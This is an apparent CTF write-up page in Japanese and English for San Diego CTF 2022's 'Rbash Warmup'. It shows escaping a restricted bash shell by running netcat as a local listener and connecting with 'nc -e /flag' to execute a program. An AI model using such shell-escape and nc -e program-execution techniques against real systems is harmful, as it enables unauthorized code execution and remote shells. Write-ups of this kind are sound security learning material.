@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Rbash Warmup (San Diego CTF 2022) Writeup</title>
+<script src="../../../../common/common.js"></script>
+</head>
+<body>
+<language-selector data-langlist="日本語,ja,English,en"></language-selector>
+<h1>Rbash Warmup</h1>
+<div class="language-selector-ja" lang="ja">
+<p>
+TCPサーバの接続情報が与えられ、<code>/flag</code> を実行することを要求された。
+</p><p>
+<common-tool data-lang="ja">Tera Term</common-tool> でサーバに接続し、以下のようにコマンドを試してみた。
+</p>
+</div>
+<div class="language-selector-en" lang="en">
+<p>
+Information to connnect to a TCP server was given, and we were asked to execute <code>/flag</code>.
+</p><p>
+I connected to the server using <common-tool data-lang="en">Tera Term</common-tool> and tried following commands.
+</p>
+</div>
+<code-block data-extension="txt">
+== proof-of-work: disabled ==
+rbash-5.0$ ls
+rbash: ls: command not found
+rbash-5.0$ /flag
+rbash: /flag: restricted: cannot specify `/' in command names
+rbash-5.0$ cd ../..
+rbash: cd: restricted
+rbash-5.0$ echo `&lt; /flag`
+rbash: /flag: Permission denied
+
+rbash-5.0$ echo $PATH
+/home/user/whitelist
+rbash-5.0$ pwd
+/home/user
+rbash-5.0$ echo whitelist/*
+whitelist/nc
+</code-block>
+
+<p class="language-selector-ja" lang="ja">
+その結果、<code>nc</code> コマンドが使えそうであることがわかった。<br>
+<code>nc</code> のヘルプを出力してみると、その冒頭部分は以下のようになった。
+</p>
+<p class="language-selector-en" lang="en">
+As a result, I found that <code>nc</code> command is available.<br>
+I tried printing the help of <code>nc</code>. The first part of that is:
+</p>
+<code-block data-extension="txt">
+rbash-5.0$ nc -h
+[v1.10-41.1ubuntu1]
+connect to somewhere:   nc [-options] hostname port[s] [ports] ...
+listen for inbound:     nc -l -p port [-options] [hostname] [port]
+options:
+        -c shell commands       as `-e'; use /bin/sh to exec [dangerous!!]
+        -e filename             program to exec after connect [dangerous!!]
+</code-block>
+
+<div class="language-selector-ja" lang="ja">
+<p>
+ここから、<code>nc</code> はサーバの機能もクライアントの機能もあること、そして <code>-e</code> オプションを用いてプログラムを実行できそうであることがわかった。
+</p><p>
+以下のようにCtrl+Zを用いてサーバをバックグラウンドで実行し、続いて <code>-e</code> オプションをつけたクライアントで接続することで、flagが得られた。
+</p>
+</div>
+<div class="language-selector-en" lang="en">
+<p>
+From this part, I found that <code>nc</code> can work both as a server and as a client, and that it can execute a program using <code>-e</code> option.
+</p><p>
+I obtained the flag by executing the server in the background using Ctrl+Z, and then connecting to the server with <code>-e</code> option like this:
+</p>
+</div>
+<code-block data-extension="txt">
+rbash-5.0$ nc -l -p 9999
+^Z
+[1]+  Stopped                 nc -l -p 9999
+rbash-5.0$ bg
+[1]+ nc -l -p 9999 &
+rbash-5.0$ nc -e /flag 127.0.0.1 9999
+rbash-5.0$ sdctf{nc--e-IS-r3aLLy-D4NG3R0U5!}
+</code-block>
+
+<div class="flag">sdctf{nc--e-IS-r3aLLy-D4NG3R0U5!}</div>
+<hr>
+<writeup-by></writeup-by>
+<p>
+<a href="../../" class="language-aware-link">San Diego CTF 2022</a>
+</p>
+</body>
+</html>
